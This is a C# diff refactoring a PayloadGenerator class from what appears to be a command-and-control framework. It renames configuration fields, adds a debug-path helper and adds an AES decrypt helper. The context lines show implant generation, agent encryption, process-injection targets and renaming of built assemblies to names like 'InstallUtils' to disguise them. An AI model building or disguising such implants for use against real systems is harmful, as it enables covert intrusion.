@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.Security.Cryptography;
 
 namespace Common.Payload;
 
@@ -19,26 +20,37 @@ public partial class PayloadGenerator
 
     public event EventHandler<string> MessageSent;
 
-    public PayloadConfig Config = null;
-    public SpawnConfig Spawn = null;
+    public FoldersConfig FoldersConfig = null;
+    public SpawnConfig SpawnConfig = null;
 
 
-    public PayloadGenerator(PayloadConfig config, SpawnConfig spawn)
+    public PayloadGenerator(FoldersConfig config, SpawnConfig spawn)
     {
-        this.Config = config;
-        this.Spawn = spawn;
+        this.FoldersConfig = config;
+        this.SpawnConfig = spawn;
     }
 
     private string Source(string fileName, ImplantArchitecture arch, bool debug)
     {
         if(debug)
-            return Path.Combine(this.Config.ImplantTemplatesFolder, "debug", fileName);
-        return Path.Combine(this.Config.ImplantTemplatesFolder, arch.ToString(), fileName);
+            return Path.Combine(this.FoldersConfig.ImplantTemplatesFolder, "debug", fileName);
+        return Path.Combine(this.FoldersConfig.ImplantTemplatesFolder, arch.ToString(), fileName);
     }
 
     private string Working(string fileName)
     {
-        return Path.Combine(this.Config.WorkingFolder, fileName);
+        return Path.Combine(this.FoldersConfig.WorkingFolder, fileName);
+    }
+
+    private string Debug(string implantName, string fileName)
+    {
+
+        var path = Path.Combine(this.FoldersConfig.WorkingFolder, "Debug", implantName);
+        
+        if (!Directory.Exists(path))
+            Directory.CreateDirectory(path);
+
+        return Path.Combine(path, fileName);
     }
 
     public byte[] GenerateImplant(ImplantConfig options)
@@ -232,7 +244,7 @@ public partial class PayloadGenerator
         byte[] bytes = File.ReadAllBytes(psPath);
 
 
-        File.Delete(Path.Combine(this.Config.WorkingFolder, psPath));
+        File.Delete(Path.Combine(this.FoldersConfig.WorkingFolder, psPath));
 
 
         return bytes;
@@ -256,7 +268,7 @@ public partial class PayloadGenerator
         });
 
         if(options.IsDebug)
-            File.WriteAllBytes(Path.Combine(options.DebugPath,"BaseAgent.exe"), agent);
+            File.WriteAllBytes(this.Debug(options.ImplantName, "BaseAgent.exe"), agent);
 
 
         this.MessageSent?.Invoke(this, $"Encrypting Agent...");
@@ -280,12 +292,12 @@ public partial class PayloadGenerator
                     {
                         { "Patcher", Encoding.UTF8.GetBytes(patcherb64) },
                         { "PatchKey", encPatcher.Secret },
-                        { "Implant", Encoding.UTF8.GetBytes(agentb64) },
+                        { "Payload", Encoding.UTF8.GetBytes(agentb64) },
                         { "Key", encAgent.Secret }
                     });
             var resultAgent = AssemblyEditor.ChangeName(starter, "InstallUtils");
             if (options.IsDebug)
-                File.WriteAllBytes(Path.Combine(options.DebugPath, "Starter.exe"), starter);
+                File.WriteAllBytes(this.Debug(options.ImplantName, "Starter.exe"), starter);
             return resultAgent;
         }
         else
@@ -303,7 +315,7 @@ public partial class PayloadGenerator
             var resultAgent = AssemblyEditor.ChangeName(service, "InstallSvc");
 
             if (options.IsDebug)
-                File.WriteAllBytes(Path.Combine(options.DebugPath, "ServiceAgent.exe"), agent);
+                File.WriteAllBytes(this.Debug(options.ImplantName, "ServiceAgent.exe"), agent);
 
             return resultAgent;
         }
@@ -352,7 +364,7 @@ public partial class PayloadGenerator
 
         var injDll = LoadAssembly(this.Source(InjectSrcFile, options.Architecture, options.IsDebug));
 
-        string process = options.Architecture == ImplantArchitecture.x64 ? this.Spawn.SpawnToX64 : this.Spawn.SpawnToX86;
+        string process = options.Architecture == ImplantArchitecture.x64 ? this.SpawnConfig.SpawnToX64 : this.SpawnConfig.SpawnToX86;
         if(!string.IsNullOrEmpty(options.InjectionProcess))
             process = options.InjectionProcess;
 
@@ -420,5 +432,24 @@ public partial class PayloadGenerator
     private string Encode(byte[] bytes)
     {
         return Convert.ToBase64String(bytes); ;
+    }
+
+    private static byte[] Decrypt(string b64, string secretKey)
+    {
+        var src = Convert.FromBase64String(b64);
+        var bytes = Encoding.UTF8.GetBytes(secretKey);
+
+        byte[] key = bytes.Take(32).ToArray();
+        byte[] iv = bytes.Take(16).ToArray();
+
+        RijndaelManaged rijndael = new RijndaelManaged();
+        rijndael.KeySize = 256;
+        rijndael.BlockSize = 128;
+        rijndael.Key = key;
+        rijndael.IV = iv;
+        rijndael.Padding = PaddingMode.PKCS7;
+
+        byte[] decryptedBytes = rijndael.CreateDecryptor().TransformFinalBlock(src, 0, src.Length);
+        return decryptedBytes;
     }
 }
